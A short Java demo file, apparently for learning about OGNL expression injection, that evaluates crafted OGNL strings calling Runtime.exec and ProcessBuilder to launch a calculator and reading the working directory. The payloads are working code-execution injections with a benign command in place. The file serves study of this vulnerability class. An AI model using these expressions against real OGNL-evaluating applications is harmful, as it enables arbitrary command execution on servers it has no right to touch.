package com.test.ognl.Learning;

import ognl.Ognl;
import ognl.OgnlContext;

public class demoVuln {
    public static void main(String[] args) throws Exception {
        OgnlContext context = new OgnlContext();
        // getValue()触发
        // @[类全名(包括包路径)]@[方法名|值名]
        String expVuln1 = "@java.lang.Runtime@getRuntime().exec('/usr/bin/gnome-calculator')";
        Object ognl = Ognl.parseExpression(expVuln1);
        Object value = Ognl.getValue(ognl, context);
        System.out.println(value);
        banner();
        // setValue trigger
        // Directly Execute!
        Ognl.setValue(Runtime.getRuntime().exec("/usr/bin/gnome-calculator"), context, context.getRoot());
        // (new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()
        // Full restricted class name
        String expVuln2 = "(new java.lang.ProcessBuilder(new java.lang.String[]{\"/usr/bin/gnome-calculator\"})).start()";
        ognl = Ognl.parseExpression(expVuln2);
        value = Ognl.getValue(ognl, context);
        System.out.println(value);
        banner();
        //获取当前路径
        String expVuln3 = "@java.lang.System@getProperty(\"user.dir\")";
        ognl = Ognl.parseExpression(expVuln3);
        value = Ognl.getValue(ognl, context);
        System.out.println(value);
        banner();
    }
    public static void banner(){
        System.out.println("============================================");
    }
}
